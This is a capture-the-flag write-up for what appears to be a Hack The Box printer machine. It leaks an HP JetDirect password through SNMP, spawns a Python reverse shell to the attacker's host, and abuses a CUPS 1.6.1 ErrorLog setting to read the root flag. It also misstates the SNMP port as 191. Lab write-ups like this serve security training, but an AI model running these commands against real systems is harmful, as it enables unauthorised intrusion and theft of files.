# Recon

All-tcp scan:
```bash
nmap -p- -oA scans/nmap-alltcp 10.10.11.107
PORT   STATE SERVICE
23/tcp open  telnet
```

Detailed-scan:
```bash
nmap -p 23 -sVC -oA scans/nmap-tcpdetail 10.10.11.107
PORT   STATE SERVICE VERSION
23/tcp open  telnet?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns, tn3270:
|     JetDirect
|     Password:
|   NULL:
|_    JetDirect
```

Udp scan revealed open port 191 with SNMP service.

Trying to enumerate SNMP didn't yield any promising findings:
```bash
snmpwalk -v 2c -c public 10.10.11.107
iso.3.6.1.2.1 = STRING: "HTB Printer"
```

While port 23 prompts for password:
```bash
nc -nv 10.10.11.107 23
(UNKNOWN) [10.10.11.107] 23 (telnet) open

HP JetDirect


Password: abcd
Invalid password
```

# Shell as lp

Searching online about HP JetDirect reveals a vulnerability
that leaks a password to printer server through SNMP.
To do that, we will use special MIB, as follows:

```bash
snmpwalk -v 2c -c public 10.10.11.107 .1.3.6.1.4.1.11.2.3.9.1.1.13.0

iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 
74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135
```

To decode the hex values, we will use python script:
```python
import binascii
s='''50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 1 3 9 17 18 19 22
23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79
82 83 86 90 91 94 95 98 103 106 111 114 115 11 9 122 123 126 130 131 134 135'''

print(binascii.unhexlify(s.replace(' ','').replace('\n', '')))
```

```bash
python script.py
b'P@ssw0rd@123!!123\x13\x91q\x81\x92"2Rbs\x03\x133CSs\x83\x94$4\x95\x05\x15Eu\x86\x16WGW\x98(8i\t\x19IY\x81\x03\x10a\x11\x11A\x15\x11\x91"\x121&\x13\x011\x13A5'
```

We will use found password (P@ssw0rd@123!!123) to log in to printer:
```bash
> nc -nv 10.10.11.107 23
(UNKNOWN) [10.10.11.107] 23 (telnet) open

HP JetDirect


Password: P@ssw0rd@123!!123

Please type "?" for HELP
>
```

It seems we can execute system commands with it, using "exec".
After trying common reverse shells, finally one works:

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(
socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.8",9001));
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
import pty; pty.spawn("/bin/bash")'
```

# Root flag

While enumerating for privilege escalation, we found service running
on local network:

```bash
netstat -ant
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN
tcp        0      0 10.10.11.107:23         10.10.14.8:54338        ESTABLISHED
tcp        0     14 10.10.11.107:36514      10.10.14.8:9001         ESTABLISHED
tcp6       0      0 ::1:631                 :::*                    LISTEN
```

To connect to it, we will use tunnelling with chisel, and visit it from
our attack machine.

There is a CUPS service internet page. By default it's run by root.
It reveals it's 1.6.1 version, which is vulnerable to LFI.

Since user can both view and modify error log location, we can first point
the location to the file we want to read, and then read our "error log".

First, on our printer server:
```bash
> exec cupsctl ErrorLog="/root/root.txt"
```

Then, from attack host:
```bash
curl http://localhost:631/admin/log/error_log\?
eb3055a86c1f09876e4c8dc3880ea43c
```
